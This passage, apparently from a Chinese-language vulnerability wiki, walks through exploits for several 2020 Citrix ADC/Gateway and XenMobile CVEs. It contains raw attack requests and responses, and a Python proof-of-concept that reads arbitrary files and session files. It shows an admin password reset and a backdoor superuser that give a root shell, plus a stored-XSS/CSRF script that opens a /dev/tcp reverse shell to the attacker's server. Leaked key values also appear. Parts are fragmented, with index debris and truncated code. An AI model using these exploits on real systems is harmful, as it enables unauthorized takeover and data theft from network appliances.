Sun, 12 Jul 2020 07:54:49 GMT Server: Apache/2.4.34 (Unix) Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 4489 Connection: close Content-Type: application/xml; charset=utf-8 An internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encounteredAn internal server error was encountered -1MISMATCH_OBJECTNAME_ERRORERROR An internal server error was encounteredAn internal server error was encountered -1MISMATCH_OBJECTNAME_ERRORERROR An internal server error was encounteredAn internal server error was encountered -1MISMATCH_OBJECTNAME_ERRORERROR An internal server error was encounteredAn internal server error was encountered -1MISMATCH_OBJECTNAME_ERRORERROR An internal server error was encounteredAn internal server error was encountered -1MISMATCH_OBJECTNAME_ERRORERROR 0x05 Read Dir request POST /rapi/filedownload?filter=path:%2Fvar%2Fnstmp HTTP/1.1 Host: www.0-sec.org:9080 User-Agent: python-requests/2.20.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: N6RRf049 X-NITRO-PASS: FcdXbqXr rand_key: 32946879.1594556816473396 Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57; is_cisco_platform=0; startupapp=neo Content-Length: 31 response HTTP/1.1 406 Not Acceptable Date: Sun, 12 Jul 2020 12:27:04 GMT Server: Apache X-Frame-Options: SAMEORIGIN Expires: -1 Cache-Control: private, must-revalidate, post-check=0, pre-check=0 Pragma: private Content-Disposition: attachment;filename=\"nstmp\" Accept-Ranges: bytes Content-Length: 512 X-XSS-Protection: 1; mode=block Keep-Alive: timeout=15, max=98 Connection: Keep-Alive Content-Type: application/octet-stream ... sess_6680400dad3be5585d4ac9880d5f634f... sess_774dd8a02a254bd09c480cd0ba244598... sess_6c5c31300c22b200f0273e7a13be47cb.... 0x06 Read Session resquest POST /rapi/filedownload?filter=path:%2Fvar%2Fnstmp%2Fsess_6c5c31300c22b200f0273e7a13be47cb HTTP/1.1 Host: www.0-sec.org:9080 User-Agent: python-requests/2.20.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/xml X-NITRO-USER: N6RRf049 X-NITRO-PASS: FcdXbqXr rand_key: 32946879.1594556816473396 Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57; is_cisco_platform=0; startupapp=neo Content-Length: 31 response HTTP/1.1 406 Not Acceptable Date: Sun, 12 Jul 2020 12:30:33 GMT Server: Apache X-Frame-Options: SAMEORIGIN Expires: -1 Cache-Control: private, must-revalidate, post-check=0, pre-check=0 Pragma: private Content-Disposition: attachment;filename=\"sess_6c5c31300c22b200f0273e7a13be47cb\" Accept-Ranges: bytes Content-Length: 2162 X-XSS-Protection: 1; mode=block Keep-Alive: timeout=15, max=100 Connection: Keep-Alive Content-Type: application/octet-stream NSAPI|s:254:\"##703FFFA9A2E71F7435B67182A95E196770FF69246DB68B6BE92E825B8A520D00F1FCF6E23F897090DBDEDBE817FFE81D1501200A8BB36C9FFA176EDA41E473DC240A804B90B8BFE1EC30DA87C6FAD3261A8B3C09C7BB82F97DDB3DB41A69CA0B849AFD6B17827463358B700D5847F91F78619B8FA1A98ED4DED3509AB11C\";NSAPI_DOMAIN|s:0:\"\";NSAPI_PATH|s:1:\"/\";login_warning|s:0:\"\";sysid|s:6:\"450070\";oemid|s:1:\"0\";superuser|s:4:\"true\";nsbw|i:0;ns_is_sgw|s:5:\"false\";nsbrandDesc|s:7:\"ADC VPX\";username|s:6:\"nsroot\";timezone_offset|i:28800;nsversion|s:63:\" NS12.1: Build 55.13.nc, Date: Nov 4 2019, 22:20:18 (64-bit)\";nsversion_error|b:0;ns_mode|i:2;nshostDesc|s:22:\"49.234.251.224 (ADC01)\";nsbrand|s:2:\"NS\";nsvpx|s:3:\"VPX\";ns_model|s:4:\"1000\";ns_aws_pin|s:0:\"\";ns_is_aws|s:5:\"false\";ns_is_azure|s:5:\"false\";ns_is_gcp|s:5:\"false\";rand|s:26:\"845810655.1594556994263502\";rand_key|s:26:\"13590513441594556994263577\";licenseMap|a:62:{s:2:\"wl\";b:1;s:2:\"sp\";b:1;s:2:\"lb\";b:1;s:2:\"cs\";b:1;s:2:\"cr\";b:1;s:2:\"sc\";b:1;s:3:\"cmp\";b:1;s:5:\"delta\";b:0;s:2:\"pq\";b:1;s:3:\"ssl\";b:1;s:4:\"gslb\";b:1;s:5:\"gslbp\";b:1;s:5:\"hdosp\";b:1;s:7:\"routing\";b:1;s:2:\"cf\";b:1;s:18:\"contentaccelerator\";b:0;s:2:\"ic\";b:0;s:6:\"sslvpn\";b:1;s:14:\"f_sslvpn_users\";s:4:\"1000\";s:11:\"f_ica_users\";s:1:\"0\";s:3:\"aaa\";b:1;s:4:\"ospf\";b:1;s:3:\"rip\";b:1;s:3:\"bgp\";b:1;s:7:\"rewrite\";b:1;s:6:\"ipv6pt\";b:1;s:5:\"appfw\";b:0;s:9:\"responder\";b:1;s:4:\"agee\";b:0;s:4:\"nsxn\";b:1;s:13:\"htmlinjection\";b:1;s:7:\"modelid\";s:4:\"1000\";s:4:\"push\";b:1;s:6:\"wionns\";b:1;s:7:\"appflow\";b:1;s:11:\"cloudbridge\";b:0;s:20:\"cloudbridgeappliance\";b:0;s:22:\"cloudextenderappliance\";b:0;s:4:\"isis\";b:1;s:7:\"cluster\";b:1;s:2:\"ch\";b:1;s:6:\"appqoe\";b:1;s:10:\"appflowica\";b:1;s:13:\"isstandardlic\";b:0;s:15:\"isenterpriselic\";b:1;s:13:\"isplatinumlic\";b:0;s:9:\"issgwylic\";b:0;s:8:\"isswglic\";b:0;s:4:\"rise\";b:1;s:3:\"feo\";b:1;s:3:\"lsn\";b:1;s:13:\"licensingmode\";s:5:\"Local\";s:16:\"daystoexpiration\";s:2:\"50\";s:8:\"rdpproxy\";b:1;s:3:\"rep\";b:0;s:12:\"urlfiltering\";b:0;s:17:\"videooptimization\";b:0;s:12:\"forwardproxy\";b:0;s:15:\"sslinterception\";b:0;s:23:\"remotecontentinspection\";b:1;s:11:\"adaptivetcp\";b:0;s:3:\"cqa\";b:0;}grouping_separator|s:1:\",\";decimal_separator|s:1:\".\";defaultpartition|s:7:\"default\"; 0x07 UploadFile Getshell You Can Upload to /root/.ssh/authorized_key Note: Get rand_key & SESSID from file:sess_[32charactor] request POST /rapi/uploadtext HTTP/1.1 Host: www.0-sec.org:9080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://citrix.local/menu/neo DNT: 1 rand_key: 845810655.1594556994263502 Cookie: SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo; is_cisco_platform=0; st_splitter=350px; rdx_pagination_size=25%20Per%20Page Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 92 object={\"uploadtext\":{\"filedir\":\"/tmp/\",\"filedata\":\"123456\",\"filename\":\"test123456789.txt\"}} response HTTP/1.1 200 OK Date: Sun, 12 Jul 2020 06:15:05 GMT Server: Apache X-Frame-Options: SAMEORIGIN Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache X-XSS-Protection: 1; mode=block Content-Length: 34 Content-Type: application/json; charset=utf-8 {\"errorcode\":\"0\",\"message\":\"Done\"} 0x08 ChangePassword && SSH request PUT /nitro/v1/config/systemuser HTTP/1.1 Host: www.0-sec.org:9080 Content-Length: 83 Cache-Control: max-age=0 Accept: application/json rand_key: 845810655.1594556994263502 NITRO_WEB_APPLICATION: true If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 DNT: 1 Content-Type: application/json Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7 Cookie: is_cisco_platform=-1; rdx_pagination_size=25%20Per%20Page; SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo Connection: close {\"params\":{\"warning\":\"YES\"},\"systemuser\":{\"username\":\"nsroot\",\"password\":\"boiboi\"}} response HTTP/1.1 200 OK Date: Sun, 12 Jul 2020 12:37:56 GMT Server: Apache/2.4.34 (Unix) Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 57 Connection: close Content-Type: application/json; charset=utf-8 { \"errorcode\": 0, \"message\": \"Done\", \"severity\": \"NONE\" } SSH ssh nsroot@www.0-sec.org ############################################################################### # # # WARNING: Access to this system is for authorized users only # # Disconnect IMMEDIATELY if you are not an authorized user! # # # ############################################################################### Password: Last login: Sun Jul 12 14:12:44 2020 from 192.168.3.1 Done > shell Copyright (c) 1992-2013 The FreeBSD Project. Copyright (c) 1979, 1980, 1983, 1986, 1988, 1989, 1991, 1992, 1993, 1994 The Regents of the University of California. All rights reserved. root@localhost 0x09 CreateUser && SSH request:CreateUser POST /nitro/v1/config/systemuser HTTP/1.1 Host: www.0-sec.org:9080 Content-Length: 83 Cache-Control: max-age=0 Accept: application/json rand_key: 845810655.1594556994263502 NITRO_WEB_APPLICATION: true If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 DNT: 1 Content-Type: application/json Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7 Cookie: is_cisco_platform=-1; rdx_pagination_size=25%20Per%20Page; SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo Connection: close object={\"params\":{\"warning\":\"YES\"},\"systemuser\":{\"username\":\"nsroot1\",\"password\":\"nsroot1\",\"timeout\":\"900\",\"maxsession\":\"20\",\"logging\":\"ENABLED\",\"externalauth\":\"ENABLED\"}} response:CreateUser HTTP/1.1 201 Created Date: Sun, 12 Jul 2020 12:46:55 GMT Server: Apache X-Frame-Options: SAMEORIGIN Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: false X-XSS-Protection: 1; mode=block Content-Length: 57 Keep-Alive: timeout=15, max=100 Connection: Keep-Alive Content-Type: application/json; charset=utf-8 { \"errorcode\": 0, \"message\": \"Done\", \"severity\": \"NONE\" } request:binding superadmin policy POST /nitro/v1/config/systemuser_systemcmdpolicy_binding HTTP/1.1 Host: www.0-sec.org:9080 Content-Length: 83 Cache-Control: max-age=0 Accept: application/json rand_key: 845810655.1594556994263502 NITRO_WEB_APPLICATION: true If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 DNT: 1 Content-Type: application/json Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7 Cookie: is_cisco_platform=-1; rdx_pagination_size=25%20Per%20Page; SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo Connection: close object={\"params\":{\"warning\":\"YES\"},\"systemuser_systemcmdpolicy_binding\":{\"policyname\":\"superuser\",\"priority\":\"0\",\"username\":\"nsroot1\"}} response:binding superadmin policy HTTP/1.1 201 Created Date: Sun, 12 Jul 2020 12:55:27 GMT Server: Apache X-Frame-Options: SAMEORIGIN Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: false X-XSS-Protection: 1; mode=block Content-Length: 57 Keep-Alive: timeout=15, max=100 Connection: Keep-Alive Content-Type: application/json; charset=utf-8 { \"errorcode\": 0, \"message\": \"Done\", \"severity\": \"NONE\" } SSH ssh nsroot1@www.0-sec.org ############################################################################### # # # WARNING: Access to this system is for authorized users only # # Disconnect IMMEDIATELY if you are not an authorized user! # # # ############################################################################### Password: Last login: Sun Jul 12 20:52:27 2020 from 47.75.37.35 Done > shell Copyright (c) 1992-2013 The FreeBSD Project. Copyright (c) 1979, 1980, 1983, 1986, 1988, 1989, 1991, 1992, 1993, 1994 The Regents of the University of California. All rights reserved. root@localhost# poc 3.png #!/usr/bin/env python import requests import sys import string import random import json from urllib.parse import quote requests.packages.urllib3.disable_warnings() def random_string(length=8): chars = string.ascii_letters + string.digits random_string = ''.join(random.choice(chars) for x in range(length)) return random_string def create_session(base_url, session): url = '{0}/pcidss/report'.format(base_url) params = { 'type':'allprofiles', 'sid':'loginchallengeresponse1requestbody', 'username':'nsroot', 'set':'1' } headers = { 'Content-Type':'application/xml', 'X-NITRO-USER':random_string(), 'X-NITRO-PASS':random_string(), } data = '' proxies = {\"http\":\"http://127.0.0.1:8080/\"} session.post(url=url, params=params, headers=headers, data=data, verify=False,proxies=proxies) return session def fix_session(base_url, session): url = '{0}/menu/ss'.format(base_url) params = { 'sid':'nsroot', 'username':'nsroot', 'force_setup':'1' } proxies = {\"http\":\"http://127.0.0.1:8080/\"} session.get(url=url, params=params, verify=False,proxies=proxies) def get_rand(base_url, session): url = '{0}/menu/stc'.format(base_url) proxies = {\"http\":\"http://127.0.0.1:8080/\"} r = session.get(url=url, verify=False,proxies=proxies) for line in r.text.split('\\n'): if 'var rand =' in line: rand = line.split('\"')[1] return rand def do_lfi(base_url, session, rand): url = '{0}/rapi/filedownload?filter=path:{1}'.format(base_url, PAYLOAD) headers = { 'Content-Type':'application/xml', 'X-NITRO-USER':random_string(), 'X-NITRO-PASS':random_string(), 'rand_key':rand } data = '' proxies = {\"http\":\"http://127.0.0.1:8080/\"} r = session.post(url=url, headers=headers, data=data, verify=False,proxies=proxies) response_str = json.dumps(r.headers.__dict__['_store']) if r.status_code == 406 and \"Content-Disposition\" in response_str and r.headers[\"Accept-Ranges\"] == \"bytes\" and r.headers[\"Pragma\"] == \"private\": print (\"[+] Send Success!\") print (\"_\"*80,\"\\n\\n\") print (r.text) print (\"_\"*80) while 1: PAYLOAD1 = quote(input(\"\\n[+] Set File= \"),\"utf-8\") url = '{0}/rapi/filedownload?filter=path:{1}'.format(base_url, PAYLOAD1) r = session.post(url=url, headers=headers, data=data, verify=False,proxies=proxies) if r.status_code == 406 and \"Content-Disposition\" in response_str and r.headers[\"Accept-Ranges\"] == \"bytes\" and r.headers[\"Pragma\"] == \"private\": print (\"_\"*80,\"\\n\\n\") print (r.text) print (\"_\"*80) # pass else: print (\"[+] Error!\") def main(base_url): print ('[-] Creating session..') session = requests.Session() create_session(base_url, session) print ('[+] Got session: {0}'.format(session.cookies.get_dict()['SESSID'])) print('[-] Fixing session..') fix_session(base_url, session) print ('[-] Getting rand..') rand = get_rand(base_url, session) print ('[+] Got rand: {0}'.format(rand)) print ('[-] Re-breaking session..') create_session(base_url, session) print ('[-] Getting file..') do_lfi(base_url, session, rand) if __name__ == '__main__': # Slashes need to be urlencoded base_url = sys.argv[1] if base_url[-1] == '/': base_url = base_url[:-1] else: base_url = base_url # PAYLOAD='%2fetc%2fpasswd' PAYLOAD = quote(input(\"[+] Set File= \"),\"utf-8\") main(base_url) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:28 "},"Web安全/Citrix/（CVE-2020-8194）Citrix 未授权访问导致的任意代码执行漏洞/（CVE-2020-8194）Citrix 未授权访问导致的任意代码执行漏洞.html":{"url":"Web安全/Citrix/（CVE-2020-8194）Citrix 未授权访问导致的任意代码执行漏洞/（CVE-2020-8194）Citrix 未授权访问导致的任意代码执行漏洞.html","title":"（CVE-2020-8194）Citrix 未授权访问导致的任意代码执行漏洞","keywords":"","body":"（CVE-2020-8194）Citrix 未授权访问导致的任意代码执行漏洞 一、漏洞简介 Citrix ADC和Citrix NetScaler Gateway存在一个代码注入漏洞。未经身份验证的远程攻击者可以利用它来创建恶意文件，如果该恶意文件由管理网络上的受害者执行，则可以允许攻击者在该用户的上下文中执行任意代码。 二、漏洞影响 Citrix ADC and Citrix Gateway: \\ Citrix ADC and NetScaler Gateway: \\ Citrix ADC and NetScaler Gateway: \\ Citrix ADC and NetScaler Gateway: \\ NetScaler ADC and NetScaler Gateway: \\ Citrix SD-WAN WANOP: \\ Citrix SD-WAN WANOP: \\ Citrix SD-WAN WANOP: \\ Citrix Gateway Plug-in for Linux: \\ 三、复现过程 通过URL来生成Java Web Start文件，此URL不需要身份验证： GET /menu/guiw?nsbrand=1&protocol=2&id=3&nsvpx=4 HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Cookie: startupapp=st Upgrade-Insecure-Requests: 1 此时Citrix会为用户返回一个生成的文件，且该文件会被允许连接到Citrix设备之中 HTTP/1.1 200 OK Date: Tue, 21 Jan 2020 20:32:44 GMT Server: Apache X-Frame-Options: SAMEORIGIN Cache-Control: max-age=10 X-XSS-Protection: 1; mode=block Content-Length: 2320 Connection: close Content-Type: application/x-java-jnlp-file GUI citrix.local Citrix Systems, Inc. Configuration Utility - Web Start Client -D 0 -WS 0 -codebase 2://citrix.local -ns4 1 -ns104 如上所示，用户输入的代码，会直接反馈在输出中，那我们就可以尝试一下执行恶意代码 GET /menu/guiw?nsbrand=HENKA&protocol=wiki.0-sec.org\">&id=HENKC&nsvpx=phpinfo HTTP/1.1 Host: www.0-sec.org 返回值 HTTP/1.1 200 OK Date: Sun, 26 Jan 2020 12:52:01 GMT Server: Apache X-Frame-Options: SAMEORIGIN Cache-Control: max-age=10 X-XSS-Protection: 1; mode=block Content-Length: 2398 Connection: close Content-Type: application/x-java-jnlp-file ://www.0-sec.org\" href=\"/menu/guiw?nsbrand=HENKA&protocol=wiki.0-sec.org\">&id=HENKC&nsvpx=phpinfo\"> GUI citrix.local Citrix Systems, Inc. Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:28 "},"Web安全/Citrix/（CVE-2020-8195）Citrix 未授权访问漏洞/（CVE-2020-8195）Citrix 未授权访问漏洞.html":{"url":"Web安全/Citrix/（CVE-2020-8195）Citrix 未授权访问漏洞/（CVE-2020-8195）Citrix 未授权访问漏洞.html","title":"（CVE-2020-8195）Citrix 未授权访问漏洞","keywords":"","body":"（CVE-2020-8195）Citrix 未授权访问漏洞 一、漏洞简介 Citrix ADC和Citrix NetScaler Gateway存在一个信息泄露漏洞，该漏洞允许经过身份验证的远程恶意用户获取主机上的敏感信息。通过发送特制请求，攻击者可以利用此漏洞获取敏感信息，然后使用此信息对受影响的系统发起进一步的攻击。 二、漏洞影响 Citrix ADC and Citrix Gateway: \\ Citrix ADC and NetScaler Gateway: \\ Citrix ADC and NetScaler Gateway: \\ Citrix ADC and NetScaler Gateway: \\ NetScaler ADC and NetScaler Gateway: \\ Citrix SD-WAN WANOP: \\ Citrix SD-WAN WANOP: \\ Citrix SD-WAN WANOP: \\ Citrix Gateway Plug-in for Linux: \\ 三、复现过程 Citrix 默认签名处允许使用以下HTTP请求下载报告而无需进行身份验证 POST /pcidss/report?type=all_signatures&sid=254&username=nsroot&profile_name=default&set=0&sig_name=_default_signature_&sig_start_no=1 HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://citrix.local/pcidss/launch_report?type=main Content-Type: application/xml Content-Length: 0 DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 1.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:29 "},"Web安全/Citrix/（CVE-2020-8196）Citrix Nitro API 未授权访问漏洞/（CVE-2020-8196）Citrix Nitro API 未授权访问漏洞.html":{"url":"Web安全/Citrix/（CVE-2020-8196）Citrix Nitro API 未授权访问漏洞/（CVE-2020-8196）Citrix Nitro API 未授权访问漏洞.html","title":"（CVE-2020-8196）Citrix Nitro API 未授权访问漏洞","keywords":"","body":"（CVE-2020-8196）Citrix Nitro API 未授权访问漏洞 一、漏洞简介 Citrix ADC和Citrix NetScaler Gateway存在一个信息泄露漏洞，该漏洞允许经过身份验证的远程恶意用户获取主机上的敏感信息。通过发送特制请求，攻击者可以利用此漏洞获取敏感信息，然后使用此信息对受影响的系统发起进一步的攻击。 二、漏洞影响 Citrix ADC and Citrix Gateway: \\ Citrix ADC and NetScaler Gateway: \\ Citrix ADC and NetScaler Gateway: \\ Citrix ADC and NetScaler Gateway: \\ NetScaler ADC and NetScaler Gateway: \\ Citrix SD-WAN WANOP: \\ Citrix SD-WAN WANOP: \\ Citrix SD-WAN WANOP: \\ Citrix Gateway Plug-in for Linux: \\ 三、复现过程 Nitro API 可以给用户使用，还可以给其他Citrix组件使用 举例，当我们发送 则会返回 0DoneNONE 并且可以在未登陆的使情况进行命令请求 354Invalid username or passwordERROR 在这里会返回一个错误代码，该代码0表示一切正常，>0表示失败。API会检查几个HTTP标头，并将它们的值用于事物。其中之一是X-NITRO-ONERROR函数中的标头get_params()。 // Setting the header X-NITRO-ONERROR for bulk request $nitro_error = $this->get_headervalue($headers, \"X-NITRO-ONERROR\"); if (isset($nitro_error)) $onerror = $this->get_headervalue($headers, \"X-NITRO-ONERROR\"); $saveconfig = $this->get_headervalue($headers, \"X-NITRO-SAVECONFIG\"); $enablefeature = $this->get_headervalue($headers, \"X-NITRO-ENABLEFEATURE\"); // Constructing the params. $params = $this->validate_and_post_json_request_params($action, $format, $onerror, $override, $warning, $idempotent, $saveconfig, $enablefeature); return $params; 在validate_and_post_json_request_params()函数中，我们的控制值into $onerror被添加$json_request_params并返回为$params： // Validating and constructing params in nitro payload. private function validate_and_post_json_request_params($action, $format, $onerror, $override, $warning, $idempotent, $saveconfig, $enablefeature) { [..] if(isset($onerror)) $json_request_params[\"onerror\"] = $onerror; $json_request_params[\"httpheaders\"] = \"yes\"; return $json_request_params; } $params然后将变量传递给get_payload()函数： if (($post_body = $this->get_payload($content, $entity_type, $params, null)) === false) return $post_body; 此函数创建\"Nitro有效载荷\"并返回它，以便可以在内部API调用中使用。该函数X-NITRO-ONERROR在返回之前直接将几个参数的值（包括标头）直接粘贴到XML有效负载中： // Constructing the nitro payload. private function get_payload($content, $entity_type, $params, $objectname) { $error = false; $request = array(); $entity_list = $entity_type . \"_list\"; if (preg_match(\"/^print_error_message(\"Invalid Xml Input\"); return false; } if (isset($objectname)) { if (strcmp($req->getName(), $objectname) != 0) { header(\"HTTP/1.1 400 Bad Request\"); $this->print_error_message(\"Invalid Xml Payload. Mismatch between content-type and payload\"); return false; } } $xml = \"\\n\" . \"\" . $content . \"\" . $this->arrayToXMLString($params,\"params\") . \"\"; return $xml; } 这意味着我们可以控制此XML文档中放置的元素。这个XML是通过几个函数返回的，最终以一个称为的变量结束，该变量$post_body作为该函数的参数给出nsrest_exec()。该函数调用的输出发送到该send_reponse()函数： $response = nsrest_exec($is_gui, $this->request_method, $post_body, $this->username, $this->password, $this->get_client_ip(), $_SERVER[\"SERVER_ADDR\"], $partid); if($this->is_direct_invocation) return $response[\"response\"]; $this->send_response($response, $this->request_method, $this->validate_and_get_entity_type($arg_list), $is_gui); 该nsrest_exec()函数是Citrix随附的自定义PHP函数，位于一个名为的库文件中libphp7.so。该函数或者在成功执行时返回XML对象，或者在执行FALSE失败时返回XML对象。沿线的某个地方FALSE变成，NULL然后NULL变成0。我不知道确切的内部工作原理，nsrest_exec但总而言之：无效的XML X-NITRO-ONERROR表示一切正常的响应。 例如，此请求包含无效的XML： POST /nitro/v1/config/server HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: application/xml Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://citrix.local/menu/neo Content-Type: application/xml If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT DNT: 1 Connection: close Content-Length: 17 X-NITRO-ONERROR: exityesxmlyes 返回值 HTTP/1.1 201 Created Date: Tue, 28 Jan 2020 10:52:07 GMT Server: Apache X-Frame-Options: SAMEORIGIN Set-Cookie: SESSID=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache X-XSS-Protection: 1; mode=block Content-Length: 126 Connection: close Content-Type: application/xml; charset=utf-8 0DoneNONE** 如上所示一切正常，并且身份验证已通过。实际上什么也没有发生，但是使用错误代码就可以来验证API调用是否成功 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:29 "},"Web安全/Citrix/（CVE-2020-8198）Citrix 储存型xss/（CVE-2020-8198）Citrix 储存型xss.html":{"url":"Web安全/Citrix/（CVE-2020-8198）Citrix 储存型xss/（CVE-2020-8198）Citrix 储存型xss.html","title":"（CVE-2020-8198）Citrix 储存型xss","keywords":"","body":"（CVE-2020-8198）Citrix 储存型xss 一、漏洞简介 要求受害者以NSIP管理员（nsroot）的身份登录 二、漏洞影响 Citrix ADC and Citrix Gateway: \\ Citrix ADC and NetScaler Gateway: \\ Citrix ADC and NetScaler Gateway: \\ Citrix ADC and NetScaler Gateway: \\ NetScaler ADC and NetScaler Gateway: \\ Citrix SD-WAN WANOP: \\ Citrix SD-WAN WANOP: \\ Citrix SD-WAN WANOP: \\ Citrix Gateway Plug-in for Linux: \\ 三、复现过程 POST /menu/stapp HTTP/1.1 Host: www.0-sec.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 96 Content-Type: application/x-www-form-urlencoded X-NITRO-USER: henk sid=254&pe=1,2,3,4,5&appname=%0aalert('xss')&au=1&username=nsroot 深入利用 csrf.html history.pushState('', '', '/') \" /> code_exec.js function load(url, callback) { var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState === 4) { rand = callback(xhr.response); exec_command(rand); } } xhr.open('GET', url, true); xhr.send(''); } function get_rand(payload) { var lines = payload.split(\"\\n\"); for(var i = 0; i %26 /dev/tcp/你的服务器/16588 0>%261\\\"' var obj = { \"params\":{ \"warning\":\"YES\" }, \"remote_shell\":{ \"command\":command, \"prompt\":\">\", \"target\":\"shell\", \"suppress\":0, \"execute_in_partition\":\"\" } } var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState === 4) { response = JSON.parse(xhr.response); alert(response['remote_shell']['output']); } } xhr.open('POST', url, true); xhr.setRequestHeader('rand_key', rand) xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded') xhr.send('object=' + JSON.stringify(obj)); } var url = '/menu/stc'; load(url, get_rand) 1.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:49:29 "},"Web安全/Citrix/（CVE-2020-8209）Citrix XenMobile目录遍历任意文件读取漏洞/（CVE-2020-8209）Citrix XenMobile目录遍历任意文件读取漏洞.html":{"url":"Web安全/Citrix/（CVE-2020-8209）Citrix XenMobile目录遍历任意文件读取漏洞/（CVE-2020-8209）Citrix XenMobile目录遍历任意文件读取漏洞.html","title":"（CVE-2020-8209）Citrix XenMobile目录遍历任意文件读取漏洞","keywords":"","body":"（CVE-2020-8209）Citrix XenMobile目录遍历任意文件读取漏洞.md Citrix Endpoint Management（也称为XenMobile）用于管理员工的移动设备和移动应用程序。通常，由于Active Directory集成，它部署在网络外围并可以访问内部网络。这使XenMobile成为安全研究的主要目标。 在此类研究中，发现了路径遍历漏洞。此漏洞允许未经授权的用户读取任意文件，包括包含密码的配置文件。 CVE-2020-8209 –路径遍历 利用此漏洞，可以读取Web服务器根目录之外的任意文件，包括配置文件和敏感的加密密钥。不需要授权。在文件help-sb-download.jsp中标识了易受攻击的代码： 该参数sbFileName与字符串连接/opt/sas/support/，之后将字符串作为参数提供给File类构造函数。结果显示在以下屏幕截图中： 解密配置密码 尽管该应用程序以tomcat用户的特权运行，但仍可以读取诸如的配置文件/opt/sas/sw/config/sftu.properties。 密码已加密并以以下两种格式之一存储：{aes} [base64文本]或{aes} {db} [base64文本]。加密由库/opt/sas/sw/lib/libsecure.so和DataSecurity.jar处理。为了解密，需要相应的密钥。它们位于文件中/opt/sas/rt/keys/security.properties，可以使用路径遍历漏洞进行下载。 P.TXT1=vfjgegdwecmykhbispfg P.TXT2=mbezvftvzwjopiruwewm P.TXT3=gzaoaxmebrgffquankdx P3.Salt=W3UK3PtDVgYq9Jd9QKReAw== NLK=cT4nkjXGc/iUZ2TvCVkvmsZAsNTG/6OgE08ZMWvATcL2fXFgfwAJO/nhE7jsi6Zh NLKS=SC01Cg== 